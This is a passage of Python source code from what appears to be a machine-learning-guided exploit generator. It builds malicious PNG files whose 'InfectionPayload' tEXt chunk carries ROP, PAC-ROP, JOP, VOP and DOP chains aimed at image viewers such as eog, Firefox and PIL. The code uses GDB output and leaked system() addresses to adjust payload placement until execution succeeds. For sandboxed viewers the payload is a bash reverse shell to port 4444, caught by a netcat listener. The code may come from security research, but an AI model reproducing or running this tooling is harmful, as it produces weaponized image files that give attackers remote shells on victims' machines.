            # If a model was previously loaded but had mismatch, try loading again with strict=False
            model_path = "models/vaegan_fuzzer_model.pth"
            if os.path.exists(model_path):
                try:
                    self.ml_model.load_state_dict(torch.load(model_path, map_location=self.device), strict=False)
                    logger.info(f"Re-loaded pre-trained VAEGAN model with updated dimensions from {model_path} (strict=False).")
                except Exception as e:
                    logger.error(f"Failed to re-load VAEGAN model after dimension update: {e}. Proceeding with fresh training.")

        if self.ml_model:
            logger.info("Starting VAE/GAN model training...")
            writer = SummaryWriter("runs/fuzzing")
            train_vaegan(self.ml_model, dataset, epochs=epochs, writer=writer, batch_size=32, device=self.device) # Use passed epochs
            writer.close()
            
            # Save the trained model
            model_path = "models/vaegan_fuzzer_model.pth"
            torch.save(self.ml_model.state_dict(), model_path)
            logger.info(f"Trained VAEGAN model saved to {model_path}")

            if generate_lime_explanations:
                logger.info("Generating LIME explanations...")
                # Prepare data for LIME
                train_data_np = np.array([item[0].cpu().numpy() for item in dataset])
                
                # Feature names for LIME
                feature_names = [
                    f"file_feature_{i}" for i in range(len(samples[0].file_features))
                ] + [
                    f"status_one_hot_{i}" for i in range(len(samples[0].status_one_hot))
                ] + [
                    f"gdb_crash_feature_{i}" for i in range(len(samples[0].gdb_crash_features))
                ] + [
                    f"leaked_addr_feature_{i}" for i in range(len(samples[0].leaked_addresses_features))
                ] + [
                    f"apport_crash_feature_{i}" for i in range(len(samples[0].apport_crash_features))
                ] + [
                    f"elf_feature_{i}" for i in range(len(samples[0].elf_features))
                ] + [
                    "normalized_payload_offset", "normalized_trigger_offset"
                ]

                # Initialize LIME explainers
                self.lime_explainer_fuzz_type = LimeExplainer(
                    model=self.ml_model,
                    feature_names=feature_names,
                    class_names=self.fuzz_types_for_ml,
                    data_sample=train_data_np,
                    mode="classification",
                    device=self.device
                )
                self.lime_explainer_payload_offset = LimeExplainer(
                    model=self.ml_model,
                    feature_names=feature_names,
                    class_names=None,
                    data_sample=train_data_np,
                    mode="regression",
                    max_payload_offset=self.max_payload_offset,
                    device=self.device
                )

                # Generate and log explanations for a sample instance
                if samples:
                    sample_instance_input = dataset[0][0].detach().clone().to(self.device).unsqueeze(0)
                    sample_instance_np = sample_instance_input.cpu().numpy().squeeze(0)

                    # Fuzz Type Explanation
                    try:
                        fuzz_type_explanation = self.lime_explainer_fuzz_type.explain_fuzz_type_prediction(sample_instance_np)
                        if fuzz_type_explanation:
                            writer_lime_fuzz = SummaryWriter("runs/lime_explanations/fuzz_type")
                            plot_and_log_lime_explanation(
                                writer_lime_fuzz, fuzz_type_explanation,
                                "LIME Explanation for Fuzz Type Prediction",
                                global_step=epochs, tag="LIME/FuzzType_Explanation"
                            )
                            writer_lime_fuzz.close()
                            logger.info("LIME fuzz_type explanation generated successfully")
                    except Exception as e:
                        logger.error(f"Error generating LIME explanation for fuzz type: {e}")
                        import traceback
                        logger.error(traceback.format_exc())

                    # Payload Offset Explanation
                    try:
                        payload_offset_explanation = self.lime_explainer_payload_offset.explain_payload_offset_prediction(sample_instance_np)
                        if payload_offset_explanation:
                            writer_lime_payload = SummaryWriter("runs/lime_explanations/payload_offset")
                            plot_and_log_lime_explanation(
                                writer_lime_payload, payload_offset_explanation,
                                "LIME Explanation for Payload Offset Prediction",
                                global_step=epochs, tag="LIME/PayloadOffset_Explanation"
                            )
                            writer_lime_payload.close()
                            logger.info("LIME payload_offset explanation generated successfully")
                    except Exception as e:
                        logger.error(f"Error generating LIME explanation for payload offset: {e}")
                        import traceback
                        logger.error(traceback.format_exc())
                else:
                    logger.warning("No samples available to generate LIME explanations.")
        else:
            logger.error("VAEGAN model not initialized, cannot train.")
    
    
    def get_intelligent_suggestion(self, viewer: Dict, original_file_path: str,
                                   current_fuzz_type: str, current_payload_offset: int) -> InstrumentationSuggestion:
        """Queries the trained VAE/GAN for an instrumentation suggestion."""
        if not self.ml_model:
            logger.warning("ML model not loaded, returning default suggestion.")
            return InstrumentationSuggestion(fuzz_type_prediction=current_fuzz_type, payload_offset_prediction=current_payload_offset)

        # Extract features from the current context
        # This needs to match the input feature vector used in FuzzingDataset
        file_features = _extract_file_features(original_file_path) # Use data_processor's internal function
        # Dummy status, gdb, leaked, apport features for current context (no crash yet)
        status_one_hot = [0.0, 0.0, 0.0, 0.0, 0.0] # Assuming initial state is not crashed/successful
        gdb_crash_features = [0.0] * 5
        leaked_addresses_features = [0.0] * 3
        apport_crash_features = [0.0] * 5
        venv_python = os.path.expanduser("~/nvenv/bin/python")
        # Determine ELF path for the viewer (same logic as in data_processor.py)
        viewer_elf_paths = {
            "png_consumer": "./png_consumer", # Local executable
            # Add other specific mappings if needed
            "firefox":"/snap/bin/firefox",
            "PIL": f"{venv_python}", # Assuming pil_loader.py is run with venv python
            "eog":"/usr/bin/eog" 
            
            }
        
        elf_path = viewer_elf_paths.get(viewer['name'], f"/usr/bin/{viewer['name']}")

        
        elf_features = _extract_elf_features(elf_path) # Extract ELF features

        normalized_payload_offset = current_payload_offset / self.max_payload_offset
        current_trigger_offset = 0 # Placeholder for now, will be passed from _fuzz_single_combination
        normalized_trigger_offset = current_trigger_offset / self.max_trigger_offset


        input_features_list = (
            file_features +
            status_one_hot +
            gdb_crash_features +
            leaked_addresses_features +
            apport_crash_features +
            elf_features + # New: Include elf_features in input
            [normalized_payload_offset, normalized_trigger_offset] # Include normalized trigger_offset
        )
        input_features_tensor = torch.tensor(input_features_list, dtype=torch.float32).to(self.device)

        suggestion, _ = generate_suggestion(self.ml_model, input_features_tensor, # Unpack suggestion and raw_output
                                         self.fuzz_types_for_ml, self.chain_types_for_ml, # Pass chain_types_for_ml
                                         self.max_payload_offset, self.max_trigger_offset, device=self.device) # Explicitly pass device as keyword argument
        return suggestion

    def _check_for_new_apport_crashes(self, current_fuzzed_file_path: str, current_timestamp: float) -> Optional[ApportCrashInfo]:
        """
        Checks for new Apport crashes and tries to associate them with the current fuzzing session.
        """
        new_log_lines, self.crash_monitor_last_read_pos = monitor_apport_log(self.crash_monitor_last_read_pos)
        
        for line in new_log_lines:
            # Apport log lines often look like:
            # Feb 04 22:00:00 hostname apport[1234]: Report 'crash_report_path.crash' already exists
            # Or:
            # Feb 04 22:00:00 hostname kernel: [12345.678901] program_name[PID]: segfault at ...
            
            # Look for lines indicating a new crash report file
            match = re.search(r"Report '(/var/crash/_usr_bin_.*?\.crash)'", line)
            if match:
                report_path = match.group(1)
                apport_info = parse_apport_report(report_path)
                if apport_info:
                    # Try to associate the crash with the current fuzzed file
                    # This is a heuristic: check if the crash time is close to the fuzzing time
                    # and if the associated file (if any) matches the fuzzed file.
                    if apport_info.crash_time and abs(apport_info.crash_time - current_timestamp) < 60: # Within 60 seconds
                        if apport_info.associated_file and current_fuzzed_file_path in apport_info.associated_file:
                            logger.critical(f"Apport crash detected and associated with current fuzzing session: {report_path}")
                            return apport_info
                        elif apport_info.executable and any(v['name'] in apport_info.executable for v in self.viewers):
                            # If no specific file, but viewer executable crashed, it's likely related
                            logger.critical(f"Apport crash detected for viewer executable: {report_path}")
                            return apport_info
        return None

    def fuzz_viewer(self, viewer: Dict, file_path: str, unique_id: str, payload: str, nc_process: subprocess.Popen = None, nc_output_file: str = None) -> tuple[str, Optional[Dict]]:  # Updated signature
        """Runs a specific viewer against an infected file and attempts payload fitting."""
        logger.info(f"Testing viewer {viewer['name']} with {file_path}...")
        
        if callable(viewer["cmd"]):
            logger.debug(f"Executing callable viewer command: {viewer['cmd'].__name__} with {file_path}")
            viewer["cmd"](file_path)
        else:
            try:
                cmd = viewer["cmd"] + [file_path]
                if "thumbnailer" in viewer["name"]: # This case is not in the current viewers, but kept for robustness
                    cmd.append("/tmp/thumb.png")
                
                # Inject instrumentation shared object for target viewers that use system libpng
                # Note: PIL uses its own PNG implementation and doesn't use system libpng
                env = os.environ.copy()
                if viewer["name"] in ["eog", "firefox"]:
                    so_path = os.path.abspath("./png_instrumentation.so")
                    if os.path.exists(so_path):
                        current_ld_preload = env.get("LD_PRELOAD", "")
                        if current_ld_preload:
                            env["LD_PRELOAD"] = f"{so_path}:{current_ld_preload}"
                        else:
                            env["LD_PRELOAD"] = so_path
                        logger.debug(f"Injected instrumentation SO into {viewer['name']}: {so_path}")
                    else:
                        logger.warning(f"Instrumentation SO not found: {so_path}")
                
                logger.debug(f"Executing viewer command: {' '.join(cmd)}")
                subprocess.run(cmd, timeout=10, capture_output=True, env=env)
            except subprocess.TimeoutExpired:
                logger.warning(f"Viewer {viewer['name']} timed out for {file_path}")
                pass
            except Exception as e:
                logger.error(f"Error running {viewer['name']}: {e}")

        # Add a small delay to allow netcat output to be written
        time.sleep(1)

        executed_log = verify_payload_execution(unique_id, viewer["name"], payload, timeout=10, nc_process=nc_process, nc_output_file=nc_output_file)  # Increased timeout to 10 seconds
        if executed_log:
            return "SUCCESS", None # Return None for fitting_info when successful

        if not callable(viewer["cmd"]):
            gdb_output, payload_addr = run_under_gdb(viewer["cmd"], file_path, unique_id)
            
            if payload_addr:
                logger.info(f"Payload string '{unique_id}' found at {hex(payload_addr)} in {viewer['name']} memory!")
                modifications = []
                reg_pattern = re.compile(r'^([a-z0-9]+)\s+(0x[0-9a-f]+)', re.MULTILINE | re.IGNORECASE)
                for match in reg_pattern.finditer(gdb_output):
                    reg_name, reg_val_str = match.groups()
                    try:
                        reg_val = int(reg_val_str, 16)
                        offset = payload_addr - reg_val
                        if abs(offset) < 0x10000:
                            modifications.append(f"Register {reg_name} is at {hex(reg_val)} (offset {hex(offset)} from payload)")
                    except ValueError: continue
                
                if modifications:
                    logger.info("FITTING_SUGGESTIONS:")
                    for mod in modifications:
                        logger.info(f"  * {mod}")
                    with open(f"{file_path}.fitting.log", "w") as f:
                        f.write("\n".join(modifications))
                    #apply modifications to the file for fitting (this is a placeholder, actual implementation would depend on the specific modifications needed) 
                    if self._apply_fitting_modification(file_path, modifications): # This function would need to be implemented to actually modify the file based on the suggestions 
                        logger.debug(f"Applied fitting modifications to {file_path}: {modifications}")
                        logger.debug('Re-running viewer with modified file for fitting...')
                        logger.info(f"Successfully applied fitting modifications to {file_path} , re-evaluating viewer... ")
                        #return self.fuzz_viewer(viewer, file_path, unique_id) # Re-run the viewer with the modified file for fitting 
                    
                    else:
                        logger.warning(f"Failed to apply fitting modifications to {file_path}")
                # Return the payload address and modifications for fitting
                return "PAYLOAD_FOUND_FITTING_CALCULATED", {"payload_addr": payload_addr, "offsets": modifications}

            if "Program received signal" in gdb_output or "Segmentation fault" in gdb_output:
                logger.warning(f"Viewer {viewer['name']} crashed! Performing deep analysis...")
                analysis = analyze_crash(gdb_output, viewer["name"], viewer["cmd"]) # Pass viewer["cmd"]
                with open(f"{file_path}.{viewer['name']}.crash.log", "w") as f:
                    f.write(gdb_output)
                with open(f"{file_path}.{viewer['name']}.analysis.json", "w") as f:
                    json.dump(analysis, f, indent=2)
                
                # Check for "unsigned integer out-of-range" error
                if "unsigned integer out-of-range" in gdb_output.lower() or "invalid length" in gdb_output.lower():
                    logger.error(f"CRITICAL ERROR: Viewer {viewer['name']} reported unsigned integer out-of-range or invalid length. This weakness category might be invalid.")
                    return "CRASHED_INVALID_WEAKNESS", None
                
                return "CRASHED", None
        
        return "FAILED", None # Return None for fitting_info when failed
    def _apply_fitting_modification(self, file_path: str, modifications: List[str]):
        """Applies modifications to the file based on fitting suggestions (placeholder implementation)."""
        # Parse the modifications returned by GDB and adjust the InfectionPayload
        # padding so the payload moves closer to the target registers on the
        # next retry. The modifications list contains strings like:
        # "Register x0 is at 0x... (offset 0x... from payload)"
        try:
            if not modifications:
                logger.warning("No fitting modifications provided")
                return False

            offsets = {}
            reg_re = re.compile(r"Register\s+([a-z0-9]+)\s+is at\s+(0x[0-9a-f]+)\s*\(offset\s*(-?0x[0-9a-f]+)", re.IGNORECASE)
            for line in modifications:
                m = reg_re.search(line)
                if m:
                    reg = m.group(1).lower()
                    try:
                        off = int(m.group(3), 16)
                    except ValueError:
                        continue
                    offsets[reg] = off

            # Separate PC offset from register offsets
            pc_offset = offsets.get('pc', None)
            non_pc = {r: o for r, o in offsets.items() if r != 'pc'}
            if not non_pc:
                logger.error("Fitting calculation appears incorrect: only PC changed or no usable registers in fitting info.")
                return False
            
            #calculate offset x0 from system offset and leaked system address 
            offset_delta = self.leaks.get("system", 0) - self.leaks.get("payload", 0)
            logger.info(f"Calculated offset delta from leaked addresses: {hex(offset_delta)} (system - payload)")
            # Adjust non-PC offsets by the calculated offset delta to estimate where x0 should be for system() call
            adjusted_non_pc = {r: o + offset_delta for r, o in non_pc.items()}

            # Use median of non-PC offsets to be robust against outliers
            med_offset = int(np.median(list(adjusted_non_pc.values())))
            logger.info(f"Median non-PC offset: {hex(med_offset)} from registers: {list(adjusted_non_pc.keys())}")
            

            # If PC is exactly at payload start (offset 0), we must move the payload
            # forward (increase padding) so that preceding shellcode bytes are executed
            # before the payload string. Conversely, if PC is not at payload, we move
            # the payload toward the registers by subtracting med_offset.
            if pc_offset is not None and pc_offset == 0:
                # Default gap to allow shellcode to run (bytes). Tunable.
                desired_gap = 64
                logger.info(f"PC is at payload start; increasing padding by {desired_gap} to place payload after shellcode")
                pad_delta = desired_gap
            else:
                # Move payload toward registers by med_offset
                pad_delta = -med_offset

            # Locate the InfectionPayload tEXt chunk in the PNG and adjust padding
            with open(file_path, 'rb') as f:
                content = bytearray(f.read())

            p_key = b"InfectionPayload"
            search_pattern = b"tEXt" + p_key
            idx = content.find(search_pattern)
            if idx == -1:
                logger.error("Could not find InfectionPayload tEXt chunk in file for fitting modification")
                return False

            # chunk_type_pos points at 'tEXt', chunk_length_pos is 4 bytes before it
            chunk_type_pos = idx
            chunk_length_pos = chunk_type_pos - 4
            old_length = int.from_bytes(content[chunk_length_pos:chunk_type_pos], 'big')
            chunk_data_start = chunk_type_pos + 4
            chunk_data_end = chunk_data_start + old_length
            p_data = content[chunk_data_start:chunk_data_end]

            # p_data structure: p_key + b"\x00" + padding (A*s) + final_payload
            key_marker = p_key + b"\x00"
            if not p_data.startswith(key_marker):
                logger.error("InfectionPayload chunk data not in expected format")
                return False

            after_key = p_data[len(key_marker):]
            # count consecutive 'A' (0x41) bytes as current padding
            cur_pad = 0
            for b in after_key:
                if b == 0x41:
                    cur_pad += 1
                else:
                    break

            # New padding calculation uses pad_delta determined above
            new_pad = int(cur_pad + pad_delta)
            if new_pad < 0:
                new_pad = 0

            if new_pad == cur_pad:
                logger.info("Calculated padding equal to current padding; no change applied")
                return False

            # Reconstruct p_data with new padding and preserve rest of payload
            rest_payload = after_key[cur_pad:]
            new_p_data = key_marker + (b"A" * new_pad) + rest_payload
            new_length = len(new_p_data)
            new_crc = calculate_png_crc(b"tEXt", new_p_data)

            # Replace the chunk in content
            new_chunk = new_length.to_bytes(4, 'big') + b"tEXt" + new_p_data + new_crc
            content[chunk_length_pos:chunk_data_end+4] = new_chunk

            #update CRC of the next chunk (IEND) if it exists, since we modified the file content before it to ensure file integrity 
            iend_pos = content.find(b"IEND")
            if iend_pos != -1:
                # IEND chunk is 12 bytes: 4 bytes length + 4 bytes type + 4 bytes data + 4 bytes CRC
                iend_start = iend_pos - 4 # Start of IEND chunk (length field)
                iend_length = int.from_bytes(content[iend_start:iend_start+4], 'big')
                iend_data_start = iend_start + 8 # Start of IEND data (after length and type)
                iend_data_end = iend_data_start + iend_length
                old_iend_crc = int.from_bytes(content[iend_data_end:iend_data_end+4], 'big')
                new_iend_crc = calculate_png_crc(b"IEND", content[iend_data_start:iend_data_end])
                #new_iend_crc is already bytes, so we can directly replace the old CRC with the new one
                if new_iend_crc != old_iend_crc:
                    content[iend_data_end:iend_data_end+4] = new_iend_crc[0:4] # Ensure we only take 4 bytes for CRC  
            

            # Write back file
            with open(file_path, 'wb') as f:
                f.write(content)

            logger.info(f"Applied fitting modification: padding {cur_pad} -> {new_pad} for {file_path}")
            return True
        except Exception as e:
            logger.error(f"Error applying fitting modification: {e}")
            logger.debug(traceback.format_exc())
            return False
        
    

    def _fuzz_single_combination(self, original_file_path: str, base_file_name: str, viewer: Dict, fuzz_type: str, output_dir: str, invalid_fuzz_types: set) -> List[Dict]:
        """Fuzzes a single file with a specific viewer and fuzz_type, including retries and offset adjustments."""
        viewer_name = viewer["name"]
        results_for_combination = []
        
        if fuzz_type in invalid_fuzz_types:
            logger.info(f"Skipping {fuzz_type} for {viewer_name} due to previous invalidation.")
            return []

        key = (base_file_name, viewer_name, fuzz_type)
        if hasattr(self, 'inferred_crashed_trajectories') and key in self.inferred_crashed_trajectories:
            logger.info(f"Re-running inferred-crash trajectory: {key} (previous status corrected to CRASHED_INFERRED)")

        max_retries = 5 # Increased retries for more robust fitting
        current_payload_offset = 0
        current_trigger_offset = 0 # New: for intelligent suggestions
        
        # List of additional offsets to try if initial fitting fails
        additional_offsets = [0x8, 0x10, 0x18, 0x20, 0x28, 0x30] # Common small offsets
        tried_offsets = set()
        
        # Intelligent suggestion logic
        if self.use_intelligent or self.use_advisor:
            if self.ml_model:
                suggestion = self.get_intelligent_suggestion(viewer, original_file_path, fuzz_type, current_payload_offset)
                if self.use_advisor:
                    logger.info(f"ADVISOR: Suggested fuzz_type='{suggestion.fuzz_type_prediction}', "
                                f"payload_offset={suggestion.payload_offset_prediction}, "
                                f"trigger_offset={suggestion.trigger_offset_prediction} (Confidence: {suggestion.confidence:.2f})")
                if self.use_intelligent:
                    logger.info(f"INTELLIGENT: Applying suggestion: fuzz_type='{suggestion.fuzz_type_prediction}', "
                                f"payload_offset={suggestion.payload_offset_prediction}, "
                                f"trigger_offset={suggestion.trigger_offset_prediction}")
                    fuzz_type = suggestion.fuzz_type_prediction
                    current_payload_offset = suggestion.payload_offset_prediction
                    current_trigger_offset = suggestion.trigger_offset_prediction
                    # Add the initial intelligent suggestion to tried_offsets to avoid immediate re-suggestion
                    tried_offsets.add(current_payload_offset)
            else:
                logger.warning("ML model not loaded, intelligent suggestions are disabled.")

        for retry_attempt in range(max_retries):
            logger.info(f"Testing {viewer['name']} with {fuzz_type} on {base_file_name} (Retry {retry_attempt}, Offset {current_payload_offset}, Trigger Offset {current_trigger_offset})...")
            
            test_file_name = f"{(base_file_name)}.{viewer_name}.{fuzz_type}.retry{retry_attempt}.png"
            test_file_path = os.path.join(output_dir, test_file_name) # Use output_dir directly
            
            test_file_name = f"{(base_file_name)}.{viewer_name}.{fuzz_type}.retry{retry_attempt}.png"
            test_file_path = os.path.join(output_dir, test_file_name) # Use output_dir directly
            
            # Ensure the test file exists by copying the original
            try:
                # Ensure parent directories exist for the test_file_path
                os.makedirs(os.path.dirname(test_file_path), exist_ok=True)
                shutil.copy2(original_file_path, test_file_path)
            except FileNotFoundError:
                logger.error(f"Original file not found: {original_file_path}. Cannot create test file.")
                # Create a dummy empty file to avoid subsequent FileNotFoundError in inject_payload_with_leaks
                with open(test_file_path, 'wb') as f:
                    f.write(b'')
                injection_success = False # Mark injection as failed
                logger.error(f"Payload injection failed for {viewer_name} + {fuzz_type} (Retry {retry_attempt}) due to missing original file.")
                results_for_combination.append({
                    "viewer": viewer_name,
                    "fuzz_type": fuzz_type,
                    "file": base_file_name,
                    "status": "INJECTION_FAILED",
                    "payload_validated": False,
                    "platform": self.platform_id,
                    "timestamp": time.time(),
                    "payload_offset_attempted": current_payload_offset,
                    "trigger_offset_attempted": current_trigger_offset,
                    "retry_attempt": retry_attempt,
                    "reason": "original file missing"
                })
                continue # Skip to next retry/combination
            except Exception as e:
                logger.error(f"Error copying original file to {test_file_path}: {e}")
                # Create a dummy empty file to avoid subsequent FileNotFoundError in inject_payload_with_leaks
                with open(test_file_path, 'wb') as f:
                    f.write(b'')
                injection_success = False # Mark injection as failed
                logger.error(f"Payload injection failed for {viewer_name} + {fuzz_type} (Retry {retry_attempt}) due to copy error.")
                results_for_combination.append({
                    "viewer": viewer_name,
                    "fuzz_type": fuzz_type,
                    "file": base_file_name,
                    "status": "INJECTION_FAILED",
                    "payload_validated": False,
                    "platform": self.platform_id,
                    "timestamp": time.time(),
                    "payload_offset_attempted": current_payload_offset,
                    "trigger_offset_attempted": current_trigger_offset,
                    "retry_attempt": retry_attempt,
                    "reason": "file copy error"
                })
                continue # Skip to next retry/combination
            
            unique_id = f"pwned_{viewer_name}_{fuzz_type}_{int(time.time())}_{retry_attempt}"
            
            # Generate payload based on viewer type
            if viewer_name == "png_consumer":
                # png_consumer is not sandboxed, use logger for verification
                payload = f"/usr/bin/logger '{unique_id}'"
            else:
                # Sandboxed viewers (firefox, eog, PIL): use reverse shell
                # Include logger for verification, then connect to netcat and echo the unique_id
                reverse_shell_cmd = f"bash -c '(echo {unique_id}; exec bash -i 2>&1) &>/dev/tcp/127.0.0.1/4444'"
                payload = f"/usr/bin/logger '{unique_id}'; {reverse_shell_cmd}"
            
            injection_success = False
            if fuzz_type == "metadata_trigger":
                injection_success = inject_metadata_trigger(test_file_path, payload)
            else:
                injection_success = inject_payload_with_leaks(test_file_path, payload, trigger_offset=current_trigger_offset, fuzz_type=fuzz_type, leaks=self.leaks, payload_offset=current_payload_offset)

            if injection_success:
                current_timestamp = time.time() # Capture timestamp before viewer run

                # Ensure persistent netcat listener is running before payload execution
                self.ensure_netcat_listener()
                nc_process = self.netcat_process
                nc_output_file = self.netcat_output_file

                if "127.0.0.1:4444" in payload and (not nc_process or nc_process.poll() is not None):
                    logger.warning("Netcat listener went down, restarting persistent listener")
                    self.ensure_netcat_listener()
                    nc_process = self.netcat_process
                    nc_output_file = self.netcat_output_file

                status, fitting_info = self.fuzz_viewer(viewer, test_file_path, unique_id, payload, nc_process=nc_process, nc_output_file=nc_output_file)

                # If status is not SUCCESS, do a second verification check in case the first one missed it due to timing
                if status != "SUCCESS":
                    executed_log = verify_payload_execution(unique_id, viewer["name"], payload, timeout=5, nc_process=nc_process, nc_output_file=nc_output_file)
                    if executed_log:
                        logger.info(f"Payload execution confirmed on second check, correcting status to SUCCESS for {viewer_name}")
                        status = "SUCCESS"
                        fitting_info = None

                # Do NOT terminate persistent netcat after each run; keep active for all retries

                # Preserve netcat output file for post-mortem; no deletion.
                # If a temporary file path is used, preserve by renaming to persistent.
                if nc_output_file and os.path.exists(nc_output_file):
                    try:
                        stable_path = os.path.join(self.netcat_log_dir, f"netcat_{int(time.time())}.log")
                        if nc_output_file != stable_path:
                            os.rename(nc_output_file, stable_path)
                            self.netcat_output_file = stable_path
                            nc_output_file = stable_path
                            logger.info(f"Preserved netcat output by renaming to {stable_path}")
                    except Exception as e:
                        logger.error(f"Failed preserving netcat output file: {e}")

                logger.info(f"Result for {viewer['name']} + {fuzz_type} (Retry {retry_attempt}, Offset {current_payload_offset}, Trigger Offset {current_trigger_offset}): {status}")

                reason = "unknown" # Default reason
                confidence_score = 0.0  # Confidence calculation based on status
                if status == "SUCCESS":
                    reason = "payload executed"
                    confidence_score = 1.0  # Highest confidence for successful execution
                elif status == "SUCCESS_PAC_ROP":
                    reason = "payload executed (PAC-ROP bypass)"
                    confidence_score = 0.95
                elif status == "SUCCESS_JOP":
                    reason = "payload executed (JOP bypass)"
                    confidence_score = 0.95
                elif status == "SUCCESS_VOP":
                    reason = "payload executed (VOP bypass)"
                    confidence_score = 0.95
                elif status == "SUCCESS_DOP":
                    reason = "payload executed (DOP bypass)"
                    confidence_score = 0.95
                elif status == "PAYLOAD_FOUND_FITTING_CALCULATED":
                    reason = "leaked addresses need modification"
                    confidence_score = 0.7  # High confidence that the approach is correct but needs adjustment
                elif status == "FAILED":
                    reason = "not triggered"
                    confidence_score = 0.1  # Low confidence that this combination will work
                elif status == "CRASHED":
                    reason = "crashed"
                    confidence_score = 0.3  # Moderate confidence - we triggered something
                elif status == "CRASHED_INVALID_WEAKNESS":
                    reason = "crashed (invalid weakness)"
                    confidence_score = 0.0  # Invalid weakness should be retried with different types
                elif status == "CRASHED_APPORT":
                    reason = "crashed (Apport detected)"
                    confidence_score = 0.4  # Moderate confidence - detected crash but may not be reliable

                result_entry = {
                    "viewer": viewer_name,
                    "fuzz_type": fuzz_type,
                    "file": base_file_name,
                    "status": status,
                    "payload_validated": ("SUCCESS" in status) or bool(executed_log),
                    "platform": self.platform_id,
                    "timestamp": current_timestamp,
                    "payload_offset_attempted": current_payload_offset,
                    "trigger_offset_attempted": current_trigger_offset,
                    "retry_attempt": retry_attempt,
                    "reason": reason,
                    "confidence_score": confidence_score
                }

                if status != "SUCCESS" and fitting_info and fitting_info.get("payload_addr") and fitting_info.get("offsets"):
                    print(f"Fitting info for {viewer_name} + {fuzz_type}: Payload address: {hex(fitting_info['payload_addr'])}, Offsets: {fitting_info['offsets']}" )
                    result_entry["fitting_payload_addr"] = hex(fitting_info["payload_addr"])
                    result_entry["fitting_offsets"] = fitting_info["offsets"]

                # Check for Apport crashes after each attempt
                if self.use_intelligent or self.use_advisor:
                    apport_crash_info = self._check_for_new_apport_crashes(test_file_path, current_timestamp)
                    if apport_crash_info:
                        logger.critical(f"Apport crash detected for {test_file_path}. Updating result entry.")
                        result_entry["apport_crash_features"] = _extract_apport_crash_features(apport_crash_info)
                        if result_entry["status"] != "CRASHED": # If not already marked as crashed by GDB
                            result_entry["status"] = "CRASHED_APPORT"
                            result_entry["reason"] = "crashed (Apport detected)"
                        # Potentially update success_label for ML training
                        result_entry["success_label"] = 0 # A crash is a failure for payload execution

                results_for_combination.append(result_entry)

                if "SUCCESS" in status:
                    logger.info(f"Saved successful sample: {test_file_path}")
                    # Log to TensorBoard if not png_consumer
                    if viewer_name != "png_consumer" and status == "SUCCESS":
                        try:
                            writer = SummaryWriter(f"runs/fuzzing/validated_payloads")
                            log_validated_payload_to_tensorboard(
                                writer, test_file_path, viewer_name, fuzz_type, 
                                step=int(time.time())
                            )
                            writer.close()
                        except Exception as e:
                            logger.error(f"Failed to log validated payload to TensorBoard: {e}")

                    # NEW: Attempt additional chains for BTI/PAC bypass testing
                    if fuzz_type in ["overflow", "uaf", "double_free", "metadata_trigger"]:
                        
                        pac_enabled = bool(self.leaks.get("pac_enabled", False))
                        vop_available = bool(self.leaks.get("gadget_vop_ldr_str_q0") or self.leaks.get("gadget_vop_fmov"))
                        
                        additional_chains = []
                        if pac_enabled and fuzz_type in ["uaf", "optimization_bypass"]:  # Match inject_payload_with_leaks condition
                            additional_chains.extend(["PAC_ROP", "JOP"])
                        if vop_available:
                            additional_chains.extend(["VOP", "DOP"])

                        
                        for chain in additional_chains:
                            logger.info(f"Attempting {chain} chain for {viewer_name} + {fuzz_type} with same settings...")
                            
                            # Create new test file for this chain
                            chain_file_name = f"{base_file_name}.{viewer_name}.{fuzz_type}.{chain}.png"
                            chain_file_path = os.path.join(output_dir, chain_file_name)
                            
                            try:
                                shutil.copy2(test_file_path, chain_file_path)
                                
                                # Inject with forced chain type
                                chain_injection_success = inject_payload_with_leaks(
                                    chain_file_path, payload, 
                                    trigger_offset=current_trigger_offset, 
                                    fuzz_type=fuzz_type, 
                                    leaks=self.leaks, 
                                    payload_offset=current_payload_offset,
                                    force_chain_type=chain
                                )
                                
                                if chain_injection_success:
                                    chain_status, _ = self.fuzz_viewer(viewer, chain_file_path, unique_id, payload)
                                    
                                    if "SUCCESS" in chain_status:
                                        logger.info(f"SUCCESS: {chain} chain bypassed BTI/PAC for {viewer_name} + {fuzz_type}")
                                        
                                        # Log successful bypass to TensorBoard
                                        try:
                                            writer = SummaryWriter(f"runs/fuzzing/bti_pac_bypasses")
                                            log_validated_payload_to_tensorboard(
                                                writer, chain_file_path, viewer_name, f"{fuzz_type}_{chain}", 
                                                step=int(time.time())
                                            )
                                            writer.close()
                                        except Exception as e:
                                            logger.error(f"Failed to log bypass to TensorBoard: {e}")
                                        
                                        # Add to results
                                        results_for_combination.append({
                                            "viewer": viewer_name,
                                            "fuzz_type": f"{fuzz_type}_{chain}",
                                            "file": base_file_name,
                                            "status": f"SUCCESS_{chain}",
                                            "payload_validated": True,
                                            "platform": self.platform_id,
                                            "timestamp": time.time(),
                                            "payload_offset_attempted": current_payload_offset,
                                            "trigger_offset_attempted": current_trigger_offset,
                                            "retry_attempt": retry_attempt,
                                            "reason": f"{chain} bypass successful",
                                            "confidence_score": 0.95
                                        })
                                    else:
                                        logger.info(f"FAILED: {chain} chain did not bypass for {viewer_name} + {fuzz_type}")
                                
                                # Clean up chain file if not successful
                                if not ("SUCCESS" in chain_status):
                                    if os.path.exists(chain_file_path):
                                        #rename to indicate failure instead of deletion for post-mortem analysis 
                                        failed_chain_path = chain_file_path.replace(".png", ".failed.png") 
                                        os.rename(chain_file_path, failed_chain_path)
                                        logger.info(f"Renamed failed chain file to {failed_chain_path} for analysis.")
                            
                            except Exception as e:
                                logger.error(f"Error testing {chain} chain: {e}")

                    return results_for_combination # Exit on success
                elif status == "PAYLOAD_FOUND_FITTING_CALCULATED" and fitting_info and fitting_info["offsets"]:
                    # Check if PC is already at payload (offset 0x0)
                    pc_offset_match = re.search(r"Register pc is at (0x[0-9a-f]+) \(offset (0x0) from payload\)", "\n".join(fitting_info["offsets"]))
                    
                    if pc_offset_match:
                        logger.info("PC register is already at payload start. Adjusting internal chain addresses instead of payload offset.")
                        # Re-inject payload with the same offset, but trigger recompilation of the chain
                        # with the actual payload_addr from fitting_info as chain_base_addr.
                        # This will adjust the gadget addresses within the chain.
                        if not inject_payload_with_leaks(test_file_path, payload, trigger_offset=current_trigger_offset,
                                                         fuzz_type=fuzz_type, leaks=self.leaks,
                                                         payload_offset=current_payload_offset, # Keep the same payload_offset
                                                         chain_base_addr=fitting_info["payload_addr"]): # Pass actual payload_addr
                            logger.error(f"Failed to re-inject payload with adjusted chain for {viewer_name} + {fuzz_type} (Retry {retry_attempt})")
                            break # Exit retry loop if re-injection fails
                        else:
